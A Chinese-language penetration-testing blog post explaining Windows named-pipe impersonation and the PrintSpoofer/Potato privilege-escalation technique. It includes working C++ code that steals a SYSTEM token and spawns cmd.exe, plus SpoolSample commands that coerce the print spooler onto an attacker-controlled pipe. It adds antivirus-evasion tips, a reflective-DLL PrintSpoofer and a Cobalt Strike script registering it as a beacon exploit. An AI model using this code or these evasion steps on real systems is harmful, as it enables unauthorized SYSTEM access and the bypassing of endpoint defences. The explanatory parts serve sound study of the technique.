---
layout: post
title:  "渗透技巧--Windows命名管道客户端模拟和PrintSpoofer原理探究"
date: 2023-07-24
categories: Potatoes家族
---


> 文章首发于Seebug Paper [Windows 命名管道客户端模拟和 PrintSpoofer 原理探究 (seebug.org)](https://paper.seebug.org/2090/)




# 前言

在Windows的实际渗透中，提权方面我们最常用到的就是众多的土豆家族

关于各种土豆的原理，似乎很多人印象中一直都是这样：利用COM interface的某些特性，诱骗具有System权限的帐户连接我们可控的RPC服务端进行身份验证，然后NTLM relay的过程，拿到System的权限。

现实是，基于这种想法利用的potatoes在win10 1089和server 2019之后基本都已失效了，现在正火热的RoguePotato (NG)，Sweetpotato(集成了Printspoofer等)，BadPotato，GodPotato等，都是结合了命名管道客户端模拟的老技术

命名管道客户端模拟（Named_Pipe_Client_Impersonation）可以说是中后期土豆家族的关键之处，由于微软官方认为从具有SeImpersonate privilege特权的Windows服务账户提升至 NT AUTHORITY/SYSTEM 权限是预期行为。所以此后的很长一段时间，基于命名管道客户端模拟的potato都能成为利器。

本文就通过命名管道客户端模拟（Name_pipe_client_Impersonation）的学习，初窥正活跃的potatoes家族中的成员，探究

PrintSpoofer、BadPotato、pipePotato等"当代土豆"的原理，便于实际场景中更好的选择合适的土豆。





# 正文



管道
--

  讲命名管道之前先来讲下管道。管道并不是什么新鲜事物，它是一项成熟的技术，可以在很多操作系统（Unix、Linux、Windows 等）中找到，其本质是是用于进程间通信的**共享内存区域**，确切的说应该是**线程**间的**通信方法**（IPC）。

在 Windows 系统中，存在两种类型的管道：

*   匿名管道 (Anonymous pipes)：匿名管道是基于字符和半双工的（即单向），通常在父进程和子进程之间传输数据，只能本地使用
*   命名管道 (Named pipes)：命名管道则强大的多，它是面向消息和全双工（单向或双向）的，同时还允许网络通信，用于创建客户端/服务器系统。可通过名称引用；支持多客户端连接；支持双向通信；支持异步重叠 I/O

由于匿名管道单向通信，且只能在本地使用的特性，一般用于程序输入输出的重定向，如一些后门程序获取 cmd 内容等等，在实际攻击过程中利用不多，因此就不过多展开讨论。本文的主要内容还是命名管道Named Pipes。

命名管道 Names Pipes
---------------

不仅仅是土豆家族的本地提权，内网横向三大件，都离不开命名管道

**命名管道**是一个具有名称，可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持**可靠的**、**单向或双向**的数据通信管道。命名管道的所有实例拥有**相同的名称**，但是每个实例都有其自己的缓冲区和句柄，用来为不同客户端提供独立的管道。任何进程都可以访问命名管道，并接受安全权限的检查，通过命名管道使相关的或不相关的进程之间的通讯变得异常简单。

      用命名管道来设计跨计算机应用程序实际非常简单，并不需要事先深入掌握底层网络传送协议（如TCP、UDP、IP、IPX）的知识。这是由于命名管道利用了微软网络提供者（MSNP）重定向器通过同一个网络在各进程间建立通信，这样一来，应用程序便不必关心网络协议的细节。
    
     任何进程都可以成为服务端和客户端双重角色，这使得点对点双向通讯成为可能。在这里，管道服务端进程指的是创建命名管道的一端，而管道客户端指的是连接到命名管道某个实例的一端。

总结：

*   命名管道的名称在本系统中是唯一的。
*   命名管道可以被任意符合权限要求的进程访问。
*   命名管道只能在本地创建。
*   命名管道是双向的，所以两个进程可以通过同一管道进行交互。
*   多个独立的管道实例可以用一个名称来命名。例如几个客户端可以使用名称相同的管道与同一个服务器进行并发通信。
*   命名管道的客户端可以是本地进程（本地访问：`\\.\pipe\PipeName`）或者是远程进程（访问远程： `\\ServerName\pipe\PipeName`）。
*   命名管道使用比匿名管道灵活，服务端、客户端可以是任意进程，匿名管道一般情况下用于父子进程通讯。

它与网络编程中的TCP套接字编程非常相似，都有服务端和客户端的概念，你可以拥有一个服务端监听连接，等待客户端连接到服务端以请求或发送数据的过程。	

命名管道在Windows系统中被广泛使用，用MS的工具[Pipelist - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist)，可以看到本机的命名管道及其相关信息：

<img src="/img/image-20230623111054734.png" alt="image-20230623111054734" style="zoom: 67%;" />

或者直接使用powershell命令

```powershell
Get-ChildItem \\.\pipe\
((Get-ChildItem \\.\pipe\).name)
```

<img src="/img/image-20230623135542534.png" alt="image-20230623135542534" style="zoom: 67%;" />

或者浏览器中file协议查看管道

```
file://.//pipe//
```

<img src="/img/image-20230715225048804.png" alt="image-20230715225048804" style="zoom: 67%;" />

命名管道的创建和操作是通过Windows API调用进行管理的。

对于服务端进程，常用的函数有

* `CreateNamedPipe()` 创建命名管道
* `ConnectNamedPipe()` 用于等待客户端连接

对于客户端进程，可用的函数有

* `CreateFile()`  连接到一个正在等待连接的命名管道上，成功返回后，客户进程就得到了一个指向已经建立连接的命名管道实例的句柄，到这里，服务端进程的 ConnectNamedPipe() 也就完成了其建立连接的任务。
* `CallNamedPipe()` 连接到一个消息类型的管道（如果管道的实例不可用则等待），向管道写入并从管道读取数据，然后关闭管道。

我们获得了命名管道的句柄，就可以像读/写文件一样读取/写入数据。每个命名管道都由以下**“PATH”**标识，命名管道的命名规范遵循通用命名规范（UNC）：

```
\\ServerName\pipe\PipeName
访问本机上的管道
\\.\pipe\PipeName或者\\localhost\pipe\PipeName
```

我们可以使用各种语言（如C、C#和PowerShell）来操作命名管道，因为归根结底还是对Windows api的调用。

**但是，为什么我们要关心命名管道呢？**

> 因为它允许服务端进程对连接到它的客户端进程进行**模拟**。它涉及到一个至关重要的Windows api 
>
> [ImpersonateNamedPipeClient()](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)。

<img src="/img/image-20230625143246366.png" alt="image-20230625143246366" style="zoom:67%;" />

通过调用ImpersonateNamedPipeClient()，命名管道服务端可以模拟命名管道客户端的安全上下文，**从而直接将命名管道服务端当前线程的Token令牌更改为命名管道客户端的Token令牌**，关键就在这。

再看MSDN对它的附注，和所有模拟函数（包括ImpersonateNamedPipeClient）一样，它需要满足以下条件之一：	

1. 令牌的请求模拟级别低于SecurityImpersonation，例如SecurityIdentification或SecurityAnonymous。
2. **调用者具有SeImpersonatePrivilege权限**。
3. 通过LogonUser或LsaLogonUser函数，一个进程（或调用者登录会话中的另一个进程）使用明确凭据创建了令牌。
4. 验证的身份与调用者相同。 Windows XP与SP1及更早版本：不支持SeImpersonatePrivilege权限。

这也是中后期土豆都需要SeImpersonatePrivilege权限的原因，需要这个特权才能成功调用至关重要的ImpersonateNamedPipeClient() api函数。

因此，如果我们自己创建一个恶意的命名管道服务端，并且一个具有管理员（甚至是System权限）权限的管道客户端连接到我们的管道服务端，理论上我们就可以模拟管理员用户的权限。



# 实现命名管道客户端模拟

介绍几个会使用的Win API

* GetCurrentProcess()  返回值是当前进程的伪句柄。

* OpenProcessToken() 打开与进程关联的访问令牌（Access Token），返回访问令牌的句柄的指针

* DuplicateToken() or DuplicateTokenEx() 创建一个新的访问令牌，该令牌复制已存在的[访问令牌](https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly)

* CreateProcessWithTokenW()  创建新进程及其主线程。新进程在**指定**令牌的安全上下文中运行。

* **ImpersonateNamedPipeClient()** 参上详细介绍

Demo代码实现如下

```c++
#include <iostream>
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <sddl.h>

using namespace std;

void ImpersonatedUser(HANDLE hToken)
{
    DWORD dwCreationFlags = 0;
    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    BOOL g_bInteractWithConsole = TRUE;
    LPWSTR pwszCurrentDirectory = NULL;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;
    LPVOID lpEnvironment = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup);
    CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, L"cmd.exe", dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi);
    return;
}

int wmain(int argc, wchar_t* argv[])
{
    LPWSTR pwszPipeName = argv[1];
    TOKEN_GROUPS* group_token = NULL;
    HANDLE hPipe = INVALID_HANDLE_VALUE;
    HANDLE hToken = INVALID_HANDLE_VALUE;
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };
    DWORD buffer_size = 0;

    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL);

    hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
    wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
    ConnectNamedPipe(hPipe, NULL);  
    wprintf(L"[+] A client connected!\n");

    ImpersonateNamedPipeClient(hPipe);
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
    ImpersonatedUser(hToken);
    CloseHandle(hPipe);
    return 0;
}
```

代码运行演示如下，说说实现思路

<img src="/img/seim.gif" alt="seim" style="zoom:67%;" />

这里我们用Administrator账户（具有SeImpersonatePrivilege特权）的shell终端运行自己编写的”恶意“命名管道服务端，让具有System权限的命名管道客户端向我们创建的服务端写入数据，成功运用命名管道客户端模拟以达到Token令牌窃取的效果。关键代码：

```c++
ImpersonateNamedPipeClient(hPipe);
OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
ImpersonatedUser(hToken);
```

大致可以理解为，ImpersonateNamedPipeClient(hPipe); 运行后，当前进程的Token令牌被替换为命名管道客户端的Token令牌，客户端又具有System权限，所有当前进程模拟后也具有了System权限，接着再调用OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);获取当前进程的Token令牌的句柄，并把Token令牌的句柄传给我们自己写的函数ImpersonatedUser(hToken)，达到Token令牌滥用的目的。

现在目光回到Potatoes家族，命名管道在当代土豆中扮演了怎样的角色，可以说了解了命名管道客户端模拟就是了解了当代土豆的一半，剩下一半是什么？

* 就是如何让具有System权限的管道客户端进程访问我们创建的恶意命名管道服务端

这里以经典的PrintSpoofer土豆为例，它大致可以分成两个部分：

1. 让具有SeImpersonatePrivilege特权的账户创建恶意命名管道服务端
2. **[SpoolSample](https://github.com/leechristensen/SpoolSample)** 结合Server Names路径规范解析特点，欺骗Spoolsv.exe进程（具有System权限）访问服务端，ImpersonateNamedPipeClient()替换线程令牌获得System权限



# PrintSpoofer 原理探究

PrintSpoofer的实现借鉴了[leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)和一个Server Names路径解析的技巧。

SpoolSample又被叫做打印机欺骗，自然离不开Windows的Spoolsc.exe打印机后台服务进程

<img src="/img/image-20230720170152601.png" alt="image-20230720170152601" style="zoom:80%;" />

**Spoolsv.exe**进程负责将用户提交的打印任务添加到打印队列中，并将其发送给相应的打印机进行处理。它还负责监控打印队列的状态，处理打印错误和通知用户打印任务的完成情况。Spoolsv.exe进程通常在Windows系统启动时自动运行，并在后台持续运行，确保打印机系统的正常工作。

并且它运行具有System权限

<img src="/img/image-20230720171423961.png" alt="image-20230720171423961" style="zoom:80%;" />

SpoolSample作者的解释是，SpoolSample通常被用于强制 Windows 主机通过MS-RPRN（打印机协议） RPC 接口向其他计算机进行身份验证，初衷是运用于Windows域内进行利用。分析它的原理：

Windows的`MS-RPRN`协议用于打印客户端和打印服务器之间的通信，默认情况下打印服务是启用的。

<img src="/img/image-20230716233710224.png" alt="image-20230716233710224" style="zoom:80%;" />

SpoolSample的关键是Windows API中的`RpcRemoteFindFirstPrinterChangeNotificationEx()`函数，它可以创建一个远程更改通知对象，该对象监视对打印机对象的更改，并使用 `RpcRouterReplyPrinter` 或 `RpcRouterReplyPrinterEx` 将更改通知发送到打印客户端。并且就是通过命名管道实现进程之间的通信。

其函数原型，

```
 DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(
   [in] PRINTER_HANDLE hPrinter,
   [in] DWORD fdwFlags,
   [in] DWORD fdwOptions,
   [in, string, unique] wchar_t* pszLocalMachine,
   [in] DWORD dwPrinterLocal,
   [in, unique] RPC_V2_NOTIFY_OPTIONS* pOptions
 );
```

打印机后台程序处理服务的RPC接口本就通过命名管道公开，用pipelist查看，pipename管道名就是spoolss。本机的打印机管道路径

> \\\\\.\pipe\spools

<img src="/img/image-20230720204255874.png" alt="image-20230720204255874" style="zoom:80%;" />

到这我们可能理所应当的想到printspoofer的原理，利用SpoolSample强制Windows主机上的spoolss管道客户端向我们的恶意管道服务端发起连接，利用Windows API ImpersonateNamedPipeClient()模拟客户端的Access Token进行权限提升至System权限，这么说并不准确

我们不妨看看spoolsample的利用，下面的`TARGET`和`CAPTURESERVER`最后都会被填补成UNC路径

```
SpoolSample.exe TARGET CAPTURESERVER
```

用Process Monitor记录进程读写，如下图，期间打印机Spoolsv.exe进程向管道 `\\192.168.110.137\pipe\spools` 尝试读写，但是结果是**ACCESS_DENIED**

<img src="/img/image-20230720221609510.png" alt="image-20230720221609510" style="zoom:70%;" />

肯定有朋友想到构造如下的的payload，其中 `\\192.168.110.137\pipe\demo` 是我们创建的恶意管道服务端

```
.\SpoolSample.exe 192.168.110.1 192.168.110.137\pipe\demo
```

理想的预期是在进程读写里看见Spoolsv.exe进程向我们构造的恶意管道 `\\192.168.110.137\pipe\demo` 写入数据，然后直接模拟，进而提权

很可惜，尝试失败，spoolsv.exe进程对Server name做了校验，最后还是会替换成 `\\192.168.110.137\pipe\spools` 管道。并且我们也无法创建和spools的同名恶意管道，因为它已经存在。

<img src="/img/image-20230720221937228.png" alt="image-20230720221937228" style="zoom:70%;" />

回看函数原型如下：

```c
 DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(
   [in] PRINTER_HANDLE hPrinter,
   [in] DWORD fdwFlags,
   [in] DWORD fdwOptions,
   [in, string, unique] wchar_t* pszLocalMachine,
   [in] DWORD dwPrinterLocal,
   [in, unique] RPC_V2_NOTIFY_OPTIONS* pOptions
 );
```

关键在 **pszLocalMachine：指向表示客户端计算机名称的字符串的指针。**

![image-20230721013512436](img/image-20230721013512436.png)

原因也是这里做了校验，会重置指定的命名管道

<img src="/img/image-20230721013524643.png" alt="image-20230721013524643" style="zoom:80%;" />

这里PrintSpoofer的作者是用了个Server Names路径规范化解析的技巧

如果主机名包含`/`，它将通过路径检验，但是在计算要连接的命名管道的路径时，规范化会将其转换为`\`，例如

```
.\SpoolSample.exe 192.168.110.1 192.168.110.137/test
```

<img src="/img/image-20230721015758154.png" alt="image-20230721015758154" style="zoom:80%;" />

可以看见，连接的管道已经变成了

```
\\192.168.110.137\test\pipe\spoolss
```

我们只需要根据命名管道的名称规范构造管道，举个例子

```
\\192.168.110.137\pipe\demo\pipe\spoolss
```

这里分成两部分理解

* `\\192.168.110.137\pipe` 到这是正常命名
* `\demo\pipe\spoolss` 才是我们的管道名，因为打印机进程总会把\pipe\spoolss添加在路径后面

所以用上面的命名管道客户端模拟的代码，结合SpoolSample实现提权，演示一下

<img src="/img/seimw.gif" alt="seimw" style="zoom:67%;" />

```
\\192.168.110.137/pipe/demo
通过命名检查后变成了
\\192.168.110.137\pipe\demo
最后在加上\pipe\spoolss，最终连接的命名管道就是
\\192.168.110.137\pipe\demo\pipe\spoolss
```

这也是我们需要创建的恶意命名管道服务端。PrintSpoofer的实现原理也就是这些，回看其源码

<img src="/img/image-20230721021921577.png" alt="image-20230721021921577" style="zoom:80%;" />

观察其函数头文件中的函数声明，结构结合原理一目了然

* VOID PrintUsage(); 功能提示（做免杀防特征最好直接删了）
* DWORD DoMain(); 主函数
* BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck); 检查是否有模拟特权
* BOOL GenerateRandomPipeName(LPWSTR *ppwszPipeName); 随机生成管道名，防止被杀软记录（这也是和BadPotato\pipePotato不同的地方）
* HANDLE CreateSpoolNamedPipe(LPWSTR pwszPipeName); 创建恶意命名管道服务端
* HANDLE ConnectSpoolNamedPipe(HANDLE hPipe); 异步连接命名管道
* HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName); 触发打印机进程命名管道连接
* DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam);  同上
* BOOL GetSystem(HANDLE hPipe); 模拟令牌等

在`TriggerNamedPipeConnectionThread()`这个函数中实现了SpoolSample的功能

<img src="/img/image-20230721022126500.png" alt="image-20230721022126500" style="zoom:80%;" />

顺便看了看和PrintSpooler相同原理实现的，同一时期的[BadPotato](https://github.com/BeichenDream/BadPotato)，[pipePotato](https://github.com/daikerSec/pipePotato)

大概来说，BadPotato是C#版本的PrintSpooler，结构代码也更加简化，并且恶意管道服务端用的是对方机器的名字，而PrintSpooler用的是随机生成的UUID，pipePotato则是固定的"xxx"（导致可用性也更低），其他的大差不差





# 免杀尝试

拿BadPotato做个尝试

落地静态查杀的话，直接把所有Console输出语句替换就行，但是仅仅这样过不了动态

```
Console\.WriteLine\((.*?); //直接正则替换完事了
```

<img src="/img/image-20230721215648985.png" alt="image-20230721215648985" style="zoom:67%;" />

<img src="/img/image-20230721215834751.png" alt="image-20230721215834751" style="zoom:80%;" />

下面就是看看动态了，用procmon看进程断在哪里，发现badPotato到创建cmd进程时360会提示提权风险，很明显不允许当前进程创建的新进程权限比当前的高，还是System权限的。

<img src="/img/image-20230721221230199.png" alt="image-20230721221230199" style="zoom:70%;" />

<img src="/img/image-20230721222327163.png" alt="image-20230721222327163" style="zoom:80%;" />

然后思路断了，功力不够。正好逛到Crisprx师傅的反射注入DLL结合CS免杀，用PrintSpooler实现的。学习下思路

使用的反射DLL注入项目的地址，[stephenfewer/ReflectiveDLLInjection:](https://github.com/stephenfewer/ReflectiveDLLInjection)，并且一般CS中编写反射注入DLL基本都是使用的该项目

1. 导入相关的头文件：ReflectiveDllInjection.h、ReflectiveLoader.cpp、ReflectiveLoader.h
2. 将原来部分提权的操作放到`dllmain.cpp`中，主要是放在`DLL_PROCESS_ATTACH`中
3. 这里贴下`dllmain.cpp`的代码：

```
#include "ReflectiveLoader.h"
#include "PrintSpoofer.h"
#include <iostream>
 
extern HINSTANCE hAppInstance;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
 
BOOL PrintSpoofer() {
    BOOL bResult = TRUE;
    LPWSTR pwszPipeName = NULL;
    HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
    HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
    HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
    DWORD dwWait = 0;
 
    if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME)) {
        wprintf(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
        bResult = FALSE;
        goto cleanup;
    }
 
    wprintf(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);
 
    if (!GenerateRandomPipeName(&pwszPipeName)) {
        wprintf(L"[-] Failed to generate a name for the pipe.\n");
        bResult = FALSE;
        goto cleanup;
    }
 
    if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName))) {
        wprintf(L"[-] Failed to create a named pipe.\n");
        bResult = FALSE;
        goto cleanup;
    }
 
    if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe))) {
        wprintf(L"[-] Failed to connect the named pipe.\n");
        bResult = FALSE;
        goto cleanup;
    }
 
    wprintf(L"[+] Named pipe listening...\n");
 
    if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName))) {
        wprintf(L"[-] Failed to trigger the Spooler service.\n");
        bResult = FALSE;
        goto cleanup;
    }
 
    dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
    if (dwWait != WAIT_OBJECT_0) {
        wprintf(L"[-] Operation failed or timed out.\n");
        bResult = FALSE;
        goto cleanup;
    }
 
    if (!GetSystem(hSpoolPipe)) {
        bResult = FALSE;
        goto cleanup;
    }
    wprintf(L"[+] Exploit successfully, enjoy your shell\n");
 
cleanup:
    if (hSpoolPipe)
        CloseHandle(hSpoolPipe);
    if (hSpoolPipeEvent)
        CloseHandle(hSpoolPipeEvent);
    if (hSpoolTriggerThread)
        CloseHandle(hSpoolTriggerThread);
 
    return bResult;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    BOOL bReturnValue = TRUE;
    DWORD dwResult = 0;
 
    switch (dwReason) {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
            *(HMODULE*)lpReserved = hAppInstance;
        break;
    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;
        if (PrintSpoofer()) {
            fflush(stdout);
 
            if (lpReserved != NULL)
                ((VOID(*)())lpReserved)();
        } else {
            fflush(stdout);
        }
 
        ExitProcess(0);
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return bReturnValue;
}
```

cna编写

```
sub printspoofer {
    btask($1, "Task Beacon to run " . listener_describe($2) . " via PrintSpoofer");
 
    if (-is64 $1)
    {
        $arch = "x64";
        $dll = script_resource("PrintSpoofer.x64.dll");
    } else {
        $arch = "x86";
        $dll = script_resource("PrintSpoofer.x86.dll");
    }
    $stager = shellcode($2, false, $arch);
 
    bdllspawn!($1, $dll, $stager, "PrintSpoofer local elevate privilege", 5000);
 
    bstage($1, $null, $2, $arch);
}
 
beacon_exploit_register("PrintSpoofer", "PrintSpoofer local elecate privilege", &printspoofer);
 
```

生成DLL文件，调用脚本，依然是生效的

最终效果，很多cs插件没有集成这个PrintSpooler，Taowu插件集里有，其实现思路也如上，建议集成到自己的cs工具库上。有些情况下它比BadPotato等好用

<img src="/img/image-20230722015144155.png" alt="image-20230722015144155" style="zoom:80%;" />

大致完。由于微软对SpoolSample给出的结论也是“预期行为”，理论上只要打印机后台服务程序启动，并且具有模拟特权，我们都能成功利用。So，利用前不妨`ps | findstr "spoolsv"`一下看看有没有打印机服务进程





# Learn From

[PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019 \| itm4n's blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/#getting-a-system-token)

[Windows Named Pipes & Impersonation – Decoder's Blog](https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/)

[浅析Windows命名管道Named Pipe_named pipes_谢公子的博客](https://blog.csdn.net/qq_36119192/article/details/112274131)

[PrintSpoofer提权原理探究 – Crispr –热爱技术和生活 (crisprx.top)](https://www.crisprx.top/archives/484#i-4)



